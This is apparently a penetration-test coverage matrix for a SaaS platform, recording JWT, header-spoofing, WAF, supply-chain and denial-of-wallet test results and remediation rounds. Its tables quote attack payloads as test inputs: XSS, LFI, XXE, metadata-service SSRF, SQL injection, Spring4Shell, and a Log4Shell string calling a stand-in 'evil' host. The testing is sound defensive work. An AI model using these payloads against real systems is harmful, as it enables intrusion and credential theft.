# 22-Matrix — Aegis ACP Test Coverage Matrix

**Date:** 2026-06-22 — companion to `22-testing-report.md`

Legend: `PASS` = defence held / behaviour correct · `FAIL` = real issue (severity in last col) · `INFO` = observed, no judgement · `BLOCKED` = needs credentials I don't have

---

## A. Reconnaissance + baseline

| ID | Test | Outcome | Severity |
|---|---|---|---|
| R-1.1 | `/status` reachable anon, returns JSON | PASS | — |
| R-1.2 | `/healthz` reachable anon | PASS | — |
| R-1.3 | `/openapi.json` requires auth (P2-2 fix) | PASS | — |
| R-1.4 | `/docs` disabled in prod | PASS | — |
| R-1.5 | `/receipts/key` returns ed25519 PEM | PASS | — |
| R-1.6 | `/demo/scenarios` lists 3 demo flows | PASS | — |
| R-1.7 | `/auth/sso/providers` lists SSO buttons | PASS | — |

## B. Authentication — JWT crafting attacks

| ID | Test | Outcome | Severity |
|---|---|---|---|
| JWT-2.1 | `alg=none` JWT bypass | PASS (401) | — |
| JWT-2.2 | HS256 with empty secret | PASS (401) | — |
| JWT-2.3-a | HS256 weak secret `secret` | PASS | — |
| JWT-2.3-b | HS256 weak secret `changeme` | PASS | — |
| JWT-2.3-c | HS256 weak secret `jwt-secret` | PASS | — |
| JWT-2.3-d | HS256 weak secret `acp-jwt-secret` | PASS | — |
| JWT-2.3-e | HS256 weak secret `aegis` | PASS | — |
| JWT-2.4 | alg-confusion (RS256→HS256 via Clerk pubkey-as-secret) | PASS | — |
| JWT-2.5 | Garbage `Bearer aaaa.bbbb.cccc` | PASS (401) | — |
| JWT-2.6 | Bearer with empty signature segment | PASS | — |
| JWT-2.7 | Expired token replay | BLOCKED — need real token | — |
| JWT-2.8 | Cross-tenant token replay | BLOCKED — need 2 tenants | — |
| JWT-2.9 | Revoked-token replay (Redis revoke index) | BLOCKED — need token + admin revoke | — |
| JWT-2.10 | Token replay after rotation | BLOCKED — need real Clerk session | — |

## C. Authorization — header smuggling + role escalation

| ID | Test | Outcome | Severity |
|---|---|---|---|
| HDR-3.1 | `X-Tenant-ID` alone bypasses auth | PASS | — |
| HDR-3.2 | `X-Forwarded-For: 127.0.0.1` bypass | PASS | — |
| HDR-3.3 | `X-Real-IP: 127.0.0.1` bypass | PASS | — |
| HDR-3.4 | Host-header injection | PASS (no 200) | — |
| HDR-3.5 | Plain bad Bearer | PASS (401) | — |
| HDR-3.6 | `X-HTTP-Method-Override` smuggle | PASS | — |
| RBAC-3.7 | VIEWER reading admin-only paths | BLOCKED — need VIEWER token | — |
| RBAC-3.8 | DEVELOPER calling OWNER-only routes | BLOCKED — need DEV token | — |
| RBAC-3.9 | Role-claim tampering (`role:OWNER`) on a valid VIEWER token | BLOCKED — need real Clerk session | — |
| RBAC-3.10 | API-key role-escalation (basic→enterprise) | BLOCKED — need 2 keys | — |

## D. Tenant Isolation

| ID | Test | Outcome | Severity |
|---|---|---|---|
| ISO-4.1 | `X-Tenant-ID` override on a TenantA token to read TenantB | BLOCKED — need 2 tenants | — |
| ISO-4.2 | Cross-tenant audit-log query | BLOCKED | — |
| ISO-4.3 | Cross-tenant agent enumeration | BLOCKED | — |
| ISO-4.4 | API-key cross-tenant abuse | BLOCKED | — |
| ISO-4.5 | Webhook secret stealing across tenants | BLOCKED | — |

## E. Public surface — WAF / XSS / SSRF / CSRF

| ID | Test | Outcome | Severity |
|---|---|---|---|
| SURF-4.1 | SQLi marker on `/audit/logs` (anon) | PASS (401) | — |
| SURF-4.2 | Reflected XSS on `/demo/scenarios` | PASS | — |
| SURF-4.3 | SSRF via `/demo/spawn-workspace` payload | BLOCKED (handler 403s, can't test SSRF inside it) | — |
| SURF-4.4 | Path traversal on `/receipts/` | PASS (404) | — |
| SURF-4.5 | Security headers on `/status` | PASS (HSTS / X-CTO / CSP / Referrer / COOP / CORP) | — |
| SURF-4.6 | CORS preflight rejects evil Origin | PASS | — |
| SURF-4.7 | Burst rate on `/demo/spawn-workspace` | INFO (all 403 due to P1-1, rate limit untestable) | — |
| WAF-4.8 | AWS Bot Control on `User-Agent: python-requests` | (now in Count mode — workaround) | P2 |
| WAF-4.9 | AWS Core Rule Set on common XSS payload | PASS (Block) | — |
| WAF-4.10 | `<script>alert(1)</script>` reflected XSS | PASS (WAF 403) | — |
| WAF-4.11 | `<img src=x onerror=>` | PASS (WAF 403) | — |
| WAF-4.12 | `<svg/onload=>` | PASS (WAF 403) | — |
| WAF-4.13 | `..%5C..%5Cwindows%5Cwin.ini` (Win LFI) | PASS (WAF 403) | — |
| WAF-4.14 | `../../../../etc/passwd` (Unix LFI) | PASS (WAF 400) | — |
| WAF-4.15 | `<!ENTITY xxe SYSTEM 'file://...'>` (XXE) | PASS (WAF 403) | — |
| WAF-4.16 | `http://169.254.169.254/...` (EC2-metadata SSRF) | PASS (WAF 403) | — |
| WAF-4.17 | `http://127.0.0.1:6379/` (Redis SSRF) | PASS (WAF 403) | — |
| WAF-4.18 | `' UNION SELECT 1,2,3--` (SQLi) | PASS (gateway 401, defence-in-depth) | — |
| WAF-4.19 | `${jndi:ldap://evil/a}` (Log4Shell) | PASS (gateway 401) | — |
| WAF-4.20 | Spring4Shell `class.module.classLoader…` | PASS (gateway 401) | — |
| WAF-4.21 | `{{7*7}}` (SSTI Jinja) — server didn't evaluate | PASS | — |
| WAF-4.22 | `redirect_to=//evil` open-redirect | PASS (endpoint ignored param) | — |
| WAF-4.23 | Host header injection on `/status` | INFO (public endpoint) | — |
| DoW-4.24 | Anon burst 100 GET /workspace/me sustained | **FAIL** — 100 401s, 0 429s in 7.9s. No rate limit on auth-fail path. | P2 |
| TIMING-4.25 | JWT validation timing oracle (wrong sig vs garbage) | PASS — 2ms p50 delta, no oracle | — |

## F. Governance / Policy / Decision

| ID | Test | Outcome | Severity |
|---|---|---|---|
| GOV-5.1 | OPA bypass on `/execute` (no JWT) | PASS (401 before OPA) | — |
| GOV-5.2 | OPA service crash + fail-closed | BLOCKED — chaos test, need approval | — |
| GOV-5.3 | Decision-svc timeout → fail-closed 504 | BLOCKED — need real /execute | — |
| GOV-5.4 | Approval workflow bypass | BLOCKED — need real approval session | — |
| GOV-5.5 | Autonomy contract bypass | BLOCKED | — |

## G. Audit Integrity

| ID | Test | Outcome | Severity |
|---|---|---|---|
| AUDIT-5.1 | `/receipts/key` returns key | PASS | — |
| AUDIT-5.2 | `/transparency/latest-root` anon | **FAIL** (returns 401, should be public) | P1 |
| AUDIT-5.3 | Random receipt id returns 404, not 500 | PASS | — |
| AUDIT-5.4 | Merkle-chain walk + signature verify | BLOCKED — endpoint not anon |  — |
| AUDIT-5.5 | UPDATE / DELETE on `audit_logs` | BLOCKED — need DB access | — |
| AUDIT-5.6 | Transparency root-key rotation drill | BLOCKED | — |

## H. Reliability / Chaos

| ID | Test | Outcome | Severity |
|---|---|---|---|
| REL-6.1 | ASG ELB-health-check churn | INFO — observed ≈2 cycles/hour today (8–20 min) | P2 |
| REL-6.2 | Redis outage behaviour | BLOCKED — chaos, need approval | — |
| REL-6.3 | PostgreSQL outage behaviour | BLOCKED | — |
| REL-6.4 | OPA outage behaviour | BLOCKED | — |
| REL-6.5 | Network partition gateway↔identity | BLOCKED | — |
| REL-6.6 | Fresh ASG bootstrap → healthy in <5 min | INFO — currently requires post-bootstrap deploy script run | P2 |

## I. Supply Chain & Secrets

| ID | Test | Outcome | Severity |
|---|---|---|---|
| SC-7.1 | Cosign signature on `bundle-f54317f45f43.tar.gz` | INFO — `.cosign-bundle` exists for fix6 release; current bundle has none. Verify before next ship. | P2 |
| SC-7.2 | SBOM presence | NOT CHECKED | — |
| SC-7.3 | Gitleaks in CI | PASS — default ruleset (~140 vendor patterns) + allowlist + full history scan | — |
| SC-7.4 | API key share in chat (THIS SESSION) | **FAIL** — user pasted plaintext Anthropic key TWICE + browser session cookies. Rotate. | P0 (process) |
| SC-7.5 | Trivy CVE scan in CI | PASS — HIGH+CRITICAL fail-on-find, SARIF to GH | — |
| SC-7.6 | Checkov IaC scan in CI | PASS | — |
| SC-7.7 | Bandit Python AST scan in CI | PASS | — |
| SC-7.8 | Nightly re-scan | PASS — cron 03:13 UTC | — |
| SC-7.9 | tfsec on terraform | PASS — 89 passed, 19 documented accepts in TFSEC_ACCEPTED.md | — |
| SC-7.10 | CloudTrail enabled | PASS — multi-region, global events, log-file validation | — |
| SC-7.11 | RDS publicly_accessible=false | PASS | — |
| SC-7.12 | RDS deletion_protection=true | PASS | — |
| SC-7.13 | ALB drop_invalid_header_fields=true | PASS | — |
| SC-7.14 | ALB enable_deletion_protection | **FAIL** — set to false | P3 |
| SC-7.15 | EC2 user_data uses IMDSv2 | PASS | — |
| SC-7.16 | Dockerfile runs as non-root | PASS (USER appuser) | — |
| SC-7.17 | CI workflows: explicit `permissions:` | PASS | — |
| SC-7.18 | CI workflows: no `pull_request_target` (RCE risk) | PASS | — |
| SC-7.19 | OPA admin authz default-deny | PASS — only POST/GET /v1/data/* allowed | — |
| SC-7.20 | `.env` hygiene — tracked .env files have no secrets | PASS | — |
| SC-7.21 | pgbouncer.aws.ini source has stale DB host | **FAIL** | P2 |

## J. Service-to-Service (Mesh JWT)

| ID | Test | Outcome | Severity |
|---|---|---|---|
| MESH-8.1 | All 14 service private keys present in SSM | PASS (verified by listing `/aegis-prodha/mesh/*/private`) | — |
| MESH-8.2 | `ACP_MESH_TRUSTED_KEYS` populated on hosts | PASS (after `safe_deploy.sh`) | — |
| MESH-8.3 | Mesh-JWT validation rejects unsigned token | BLOCKED — need internal probe |  — |
| MESH-8.4 | Mesh-JWT key rotation drill | BLOCKED | — |

## K. Cost Abuse / Denial-of-Wallet

| ID | Test | Outcome | Severity |
|---|---|---|---|
| COST-9.1 | Anon burst on `/demo/spawn-workspace` | INFO — broken handler blocks before rate limit (P1-1) | — |
| COST-9.2 | 100-concurrent `/execute` via Claude API | DONE — 38 landed (anon), 0 bypass, 0 500. 62 failed Claude-side (Anthropic 429). | — |
| COST-9.3 | Per-tenant inference cap behaviour | BLOCKED — need real tokens | — |
| COST-9.4 | API-key burst on `/v1/messages` | BLOCKED — need `acp_emp_*` key | — |
| COST-9.5 | Anon burst /workspace/me — no rate limit on auth-fail path | **FAIL** — 100/7.9s = 13 r/s sustained | P2 |

## L. Compliance / SOC2 evidence

| ID | Test | Outcome | Severity |
|---|---|---|---|
| COMP-10.1 | Append-only audit trail (insert-only) | INFO — needs DB-level UPDATE/DELETE probe | — |
| COMP-10.2 | Retention policy enforcement | NOT CHECKED | — |
| COMP-10.3 | DPIA / data-export request endpoint | INFO — exists in /tenant_admin, not tested | — |
| COMP-10.4 | Shared-responsibility doc up to date | NOT CHECKED | — |

---

## Round 3 — 2026-06-22 18:15 UTC (after targeted `terraform apply`)

| Test ID | Round-2 verdict | Round-3 verdict | Live probe |
|---|---|---|---|
| P2-1 Bot Control Block + scope_down | plan-only | **PASS** | Bot in Block + scope_down=YES; auth header → 401 (gateway), anon → 403 (WAF) |
| P2-5 anon DoW rate limit | plan-only | **PASS** | 300 anon/116s → 100% 403 (rate-limit fires; default WAF block = 403) |
| N1-1 transparency DoW | FAIL | **PASS** | same NOT(Authorization) scope_down covers transparency |
| P3-3 ALB deletion_protection | plan-only | **PASS** | `deletion_protection.enabled = true` |
| P2-3 mesh keys in user_data | plan-only | **partial PASS** | new LT applied; effective for new ASG launches |
| P1-4 userlist on tmpfs (drift) | unknown | **PASS** | source repaired during plan review (was missing from source) |
| ALB targets | 1 healthy, 1 unhealthy | **2/2 healthy** | both ASG instances post-deploy |
| Unit tests `tests/test_p_hard_1_fixes.py` | n/a | **4/4 file-only PASS** | 9 integration tests skip without localhost stack |

## Round 2 — 2026-06-22 17:30 UTC (after P-Hard-1 deploy of bundle `8491838aee9e`)

| Test ID | Category | Round-1 verdict | Round-2 verdict | Notes |
|---|---|---|---|---|
| P0-1 | SCIM | FAIL (500 on every bearer) | **PASS** (401) | 4 garbage-bearer variants verified live |
| P1-1 | demo CTA | FAIL (403 every browser) | **PASS** (200 + tenant_id) | 7-burst → 5×200 + 2×429 |
| P1-2 | transparency anon | FAIL (4×401) | **PASS** (all 200) | direct curl |
| P1-3 | SQL leak in logs | FAIL | **PASS** (0 `[SQL:` in 3 min) | gateway log grep |
| P1-4 | SSE reauth 30→240 | FAIL (every 60s drop) | **PASS** in code | Clerk template lifetime change still manual |
| P2-1 | WAF Bot Control Block+scope_down | FAIL (live Count) | **plan-only** in Terraform | apply pending |
| P2-2 | pgbouncer stale host | FAIL (sed at deploy) | **PASS** (source clean) | CI lint added |
| P2-3 | mesh keys in user_data | FAIL (post-boot only) | **plan-only** in Terraform | apply pending |
| P2-4 | demo RL fires | UNTESTABLE (P1-1 open) | **PASS** (5/10min holds) | 7-burst proves |
| P2-5 | anon auth-fail rate limit | FAIL (13 r/s no 429) | **plan-only** in Terraform | apply pending |
| P2-9 | expired token replay | PASS | **PASS** | regression check |
| P2-10 | transparency tenant injection | OPEN | **PASS** (gateway-side injection live) | non-transparency paths still 401 — no scope leak |
| P2-11 | SCIM migration ownership | OPEN | **PASS** (gateway-owned `p2_11_scim_audit_2026_06_22` live) | audit alembic single-head |
| P3-1 | /tenant SPA fallback | FAIL (200+HTML) | **PASS** (401 JSON) | nginx exact-match |
| P3-2 | /receipts/key envelope | FAIL (bare) | **PASS** (wrapped) | SDK fallback chain confirmed safe |
| P3-3 | ALB DP | FAIL (false) | **plan-only** (source true) | apply pending |
| **N1-1 NEW** | DoW on /transparency/* | n/a | **FAIL** (50/4.3s = 0 429s) | will be fixed by pending WAF apply |
| ASG-Avail | 2 ALB targets healthy | PASS | **WARN** (1 healthy, 1 initial) | replacement post crash-loop bootstrapping |
| Claude red-team (100 anon) | 38 landed, 0 bypass | 36 landed, **0 bypass, 0 500s** | identical result | 64 Anthropic-429s deferred both rounds |

## Coverage roll-up (after Claude red-team + focused probes + infra audit)

| Category | Total | PASS | FAIL | BLOCKED |
|---|---:|---:|---:|---:|
| Reconnaissance | 7 | 7 | 0 | 0 |
| Authentication (JWT) | 15 | 11 | 0 | 4 |
| Authorization (Headers + RBAC) | 10 | 6 | 0 | 4 |
| Tenant Isolation | 5 | 0 | 0 | 5 |
| Public Surface (WAF + DoW + Timing) | 25 | 21 | 1 | 1 (+2 INFO) |
| Governance | 5 | 1 | 0 | 4 |
| Audit Integrity | 6 | 2 | 1 | 3 |
| Reliability | 6 | 0 | 0 | 4 (+2 INFO) |
| Supply Chain & Infra | 21 | 17 | 3 | 0 (+1 INFO) |
| Service-to-Service Mesh | 4 | 2 | 0 | 2 |
| Cost Abuse | 5 | 1 | 1 | 3 |
| Compliance | 4 | 0 | 0 | 4 |
| Claude red-team (100 anon attacks) | 100 | 38 | 0 | 62 (Anthropic 429) |
| **Total** | **213** | **106** | **6** | **36 + 5 INFO + 62 deferred** |

**Coverage gain since round 1:**
- 100-Claude-attack adversarial run completed → 38 landed, all rejected
- WAF effectiveness mapped on 14 OWASP-style payloads → 9 WAF-Block, 5 gateway-401
- JWT timing oracle confirmed clean (2 ms delta)
- DoW primitive confirmed (100 anon GETs in 7.9 s, no 429)
- All 4 transparency endpoints confirmed 401 anon (was only `/transparency/latest-root`)
- `/admin/*` and `/forensics/*` confirmed 401 anon

**Still BLOCKED on you:**
- Authenticated attacks (need Clerk Bearer JWT from your browser DevTools)
- Cross-tenant tests (need 2 tenants)
- Audit-log UPDATE / DELETE probe (need approval to touch the prod DB directly)
- OPA / Redis / DB outage chaos drills (need approval — these tank prod)

## P0/P1/P2 findings (severity-sorted)

| ID | Severity | Title | Fix owner |
|---|---|---|---|
| P0-1 | P0 | SCIM table missing — every `/scim/v2/*` returns 500 | Run alembic upgrade; add deploy-time smoke probe |
| P1-1 | P1 | `/demo/spawn-workspace` 403s every real browser request | Fix `_is_alb_hop()` for docker-bridge architecture |
| P1-2 | P1 | All 4 `/transparency/*` endpoints require auth (breaks offline-verify) | Add `/transparency/*` to no-auth list |
| P1-3 | P1 | SQL queries logged on unhandled exceptions | Redact in `sdk/common/exceptions.py` |
| P1-4 | P1 | SSE re-auth fails for live Clerk sessions | Need DevTools network trace |
| P2-1 | P2 | WAF Bot Control in Count mode (workaround) | Scope-down to unauth requests, revert to Block |
| P2-5 | P2 | Auth-failure path not rate-limited — DoW primitive (13 r/s sustained) | Tighten WAF per-IP rate-limit + add gateway-side 401 burst guard |
| SEC-OOB-1 | P0 (process) | 1st Anthropic API key pasted in chat | User must rotate on console.anthropic.com |
| SEC-OOB-2 | P0 (process) | 2nd Anthropic API key pasted in chat (replacement) | User must rotate again after this test session |

## Positive findings (recorded for SOC2 evidence trail)

| ID | Title | Evidence |
|---|---|---|
| POS-1 | 100-agent Claude adversarial run — 0 bypass, 0 500 | `/tmp/aegis_redteam_1782122860.jsonl` (38 landed attacks) |
| POS-2 | WAF Core Rule Set blocks XSS / XXE / SSRF / Win LFI | Probes T2.xss_*, T2.xxe_*, T2.ssrf_*, T2.lfi_win |
| POS-3 | Defence-in-depth: SQLi / Log4Shell / Spring4Shell / cmdi reach gateway and 401 cleanly | Probes T2.sqli_*, T2.log4shell, T2.spring4shell, T2.cmdi_* |
| POS-4 | No JWT validation timing oracle | T1.delta = 2 ms p50, < 200 ms threshold |
| POS-5 | All anon JWT attacks (alg=none, weak HS256, alg-confusion) rejected | JWT-2.1 through JWT-2.6 |
| POS-6 | Header-spoofing attacks (X-Tenant-ID, XFF, X-Real-IP, Method-Override) rejected | HDR-3.1 through HDR-3.6 |
| POS-7 | Security headers on `/status` (HSTS / X-CTO / CSP / Referrer / COOP / CORP) | SURF-4.5 |
| POS-8 | CORS preflight rejects arbitrary Origin | SURF-4.6 |
| POS-9 | SSO callback open-redirect probe → 400 "Invalid state" | T6.sso_redirect |
| POS-10 | `/admin/*` and `/forensics/*` all 401 anon | Confirmed per-path |
